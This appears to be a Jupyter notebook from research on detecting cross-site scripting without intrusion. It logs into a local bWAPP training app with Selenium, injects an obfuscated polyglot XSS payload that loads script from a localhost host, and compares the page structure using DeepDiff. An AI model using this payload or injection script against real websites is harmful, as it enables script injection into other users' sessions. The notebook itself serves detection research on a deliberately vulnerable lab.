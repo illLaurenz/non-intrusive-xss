{
 "cells": [
  {
   "cell_type": "code",
   "id": "initial_id",
   "metadata": {
    "collapsed": true,
    "ExecuteTime": {
     "end_time": "2025-02-09T12:35:19.240420Z",
     "start_time": "2025-02-09T12:35:19.234Z"
    }
   },
   "source": [
    "from bs4 import BeautifulSoup\n",
    "from deepdiff import DeepDiff"
   ],
   "outputs": [],
   "execution_count": 9
  },
  {
   "metadata": {
    "ExecuteTime": {
     "end_time": "2025-02-09T12:35:19.280222Z",
     "start_time": "2025-02-09T12:35:19.248202Z"
    }
   },
   "cell_type": "code",
   "source": [
    "html = open(\"res/expected.html\").read()\n",
    "soup = BeautifulSoup(html, \"html.parser\")\n",
    "html2 = open(\"res/7.html\").read()\n",
    "soup2 = BeautifulSoup(html2, \"html.parser\")\n",
    "\n",
    "list(list(soup.body.children)[5].children)[8]\n",
    "list(list(soup2.body.children)[5].children)[8]"
   ],
   "id": "ecb91c5a6a101fcc",
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'\\n    Welcome '"
      ]
     },
     "execution_count": 10,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "execution_count": 10
  },
  {
   "metadata": {
    "ExecuteTime": {
     "end_time": "2025-02-09T12:35:19.320322Z",
     "start_time": "2025-02-09T12:35:19.301077Z"
    }
   },
   "cell_type": "code",
   "source": "DeepDiff(soup, soup2).keys()",
   "id": "fed748c60f757a7c",
   "outputs": [
    {
     "data": {
      "text/plain": [
       "dict_keys(['values_changed', 'iterable_item_added', 'iterable_item_removed'])"
      ]
     },
     "execution_count": 11,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "execution_count": 11
  },
  {
   "metadata": {
    "ExecuteTime": {
     "end_time": "2025-02-09T12:35:19.384195Z",
     "start_time": "2025-02-09T12:35:19.361886Z"
    }
   },
   "cell_type": "code",
   "source": "DeepDiff(soup, soup2)['iterable_item_added'].keys()",
   "id": "4c32343a7d5d4063",
   "outputs": [
    {
     "data": {
      "text/plain": [
       "dict_keys(['root[2][3][5][9]'])"
      ]
     },
     "execution_count": 12,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "execution_count": 12
  },
  {
   "metadata": {
    "ExecuteTime": {
     "end_time": "2025-02-09T12:35:19.445053Z",
     "start_time": "2025-02-09T12:35:19.424287Z"
    }
   },
   "cell_type": "code",
   "source": "DeepDiff(soup, soup2)['iterable_item_removed'].keys()",
   "id": "9effb5072a6067c3",
   "outputs": [
    {
     "data": {
      "text/plain": [
       "dict_keys(['root[2][3][6]', 'root[2][3][7]', 'root[2][3][8]', 'root[2][3][9]', 'root[2][3][10]', 'root[2][3][11]', 'root[2][3][12]', 'root[2][3][13]', 'root[2][3][14]', 'root[2][3][15]', 'root[2][3][16]'])"
      ]
     },
     "execution_count": 13,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "execution_count": 13
  },
  {
   "metadata": {
    "ExecuteTime": {
     "end_time": "2025-02-09T12:35:19.494936Z",
     "start_time": "2025-02-09T12:35:19.487587Z"
    }
   },
   "cell_type": "code",
   "source": [
    "from selenium import webdriver\n",
    "from selenium.webdriver.common.by import By\n",
    "\n",
    "def xss_reflected_get_firstname(driver, payload):\n",
    "    driver.get(\"http://127.0.0.1:4040/bWAPP/xss_get.php\")\n",
    "    driver.find_element(By.ID, \"firstname\").send_keys(payload)\n",
    "    driver.find_element(By.ID, \"lastname\").send_keys(\"test\")\n",
    "    driver.find_element(By.NAME, 'form').click()\n",
    "    html = driver.page_source\n",
    "    return html\n",
    "\n",
    "def login(driver):\n",
    "    driver.get(\"http://127.0.0.1:4040/bWAPP/login.php\")\n",
    "    driver.find_element(By.NAME, \"login\").send_keys(\"bee\")\n",
    "    driver.find_element(By.NAME, \"password\").send_keys(\"bug\")\n",
    "    driver.find_element(By.NAME, 'form').click()"
   ],
   "id": "48beca9efa2d904d",
   "outputs": [],
   "execution_count": 14
  },
  {
   "metadata": {
    "ExecuteTime": {
     "end_time": "2025-02-09T12:41:04.062582Z",
     "start_time": "2025-02-09T12:40:54.600938Z"
    }
   },
   "cell_type": "code",
   "source": [
    "driver = webdriver.Chrome()\n",
    "\n",
    "payload = \"\\\"<ScRiPt sRc=`http://localhost:9090`></ScRiPt>nOeMbed><ScRiPt sRc='http://localhost:9090'></ScRiPt>\\\"&gt;import(`http://localhost:9090`) <!--hTmL>' oNLoAd= )texTarEa&gt;<iMg-<ScRiPt sRc=`http://localhost:9090`></ScRiPt> oNFoCus=*/';/ifRaMe>hTmL> oNtOgGle=/*`>/sOurCe&gt; oNmOuSeLeaVe= > OnBlUr= <ScRiPt sRc='http://localhost:9090'></ScRiPt>iMg/* onClICk=import(\\\"http://localhost:9090\\\")\"\n",
    "\n",
    "login(driver)\n",
    "expected_html = xss_reflected_get_firstname(driver, \"test\")\n",
    "alt_expected_html = xss_reflected_get_firstname(driver, \"alt_sane_payload\")\n",
    "payload_html = xss_reflected_get_firstname(driver, payload)\n",
    "driver.quit()\n",
    "\n",
    "soup_expected = BeautifulSoup(expected_html, \"html.parser\")\n",
    "soup_alt_expected = BeautifulSoup(alt_expected_html, \"html.parser\")\n",
    "\n",
    "diff_expectation = DeepDiff(soup_expected, soup_alt_expected)\n",
    "print(diff_expectation.keys())\n",
    "if 'iterable_item_removed' in diff_expectation:\n",
    "    print(\"---- ITEMS REMOVE EXPECTED ----\")\n",
    "    print(diff_expectation['iterable_item_removed'].keys())\n",
    "if 'iterable_item_added' in diff_expectation:\n",
    "    print(\"---- ITEMS ADD EXPECTED ----\")\n",
    "    print(diff_expectation['iterable_item_added'].keys())\n",
    "if 'values_changed' in diff_expectation:\n",
    "    print(\"---- ITEMS CHANGE EXPECTED ----\")\n",
    "    print(diff_expectation['values_changed'].keys())\n",
    "\n",
    "\n",
    "print(\"\\n\\n\\n---- EXPERIMENT ----\")\n",
    "\n",
    "soup_payload = BeautifulSoup(payload_html, \"html.parser\")\n",
    "diff_payload = DeepDiff(soup_expected, soup_payload)\n",
    "\n",
    "print(diff_payload.keys())\n",
    "if 'iterable_item_removed' in diff_payload:\n",
    "    print(\"---- ITEMS REMOVED ----\")\n",
    "    print(diff_payload['iterable_item_removed'].keys())\n",
    "if 'iterable_item_added' in diff_payload:\n",
    "    print(\"---- ITEMS ADDED ----\")\n",
    "    print(diff_payload['iterable_item_added'].keys())\n",
    "if 'values_changed' in diff_payload:\n",
    "    print(\"---- ITEMS CHANGED ----\")\n",
    "    print(diff_payload['values_changed'].keys())\n",
    "\n"
   ],
   "id": "7577c615deaac0f1",
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "dict_keys(['values_changed'])\n",
      "---- ITEMS CHANGE EXPECTED ----\n",
      "dict_keys(['root[0][2][5][8]'])\n",
      "\n",
      "\n",
      "\n",
      "---- EXPERIMENT ----\n",
      "dict_keys(['values_changed', 'iterable_item_added', 'iterable_item_removed'])\n",
      "---- ITEMS REMOVED ----\n",
      "dict_keys(['root[0][2][6]', 'root[0][2][7]', 'root[0][2][8]', 'root[0][2][9]', 'root[0][2][10]', 'root[0][2][11]', 'root[0][2][12]', 'root[0][2][13]', 'root[0][2][14]', 'root[0][2][15]', 'root[0][2][16]'])\n",
      "---- ITEMS ADDED ----\n",
      "dict_keys(['root[0][2][5][9]', 'root[0][2][5][10]', 'root[0][2][5][11]'])\n",
      "---- ITEMS CHANGED ----\n",
      "dict_keys(['root[0][2][5][8]'])\n"
     ]
    }
   ],
   "execution_count": 19
  },
  {
   "metadata": {
    "ExecuteTime": {
     "end_time": "2025-02-09T12:35:27.030647900Z",
     "start_time": "2025-02-09T12:11:50.249211Z"
    }
   },
   "cell_type": "code",
   "source": "",
   "id": "a8f0c6104214a74a",
   "outputs": [],
   "execution_count": null
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 2
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython2",
   "version": "2.7.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
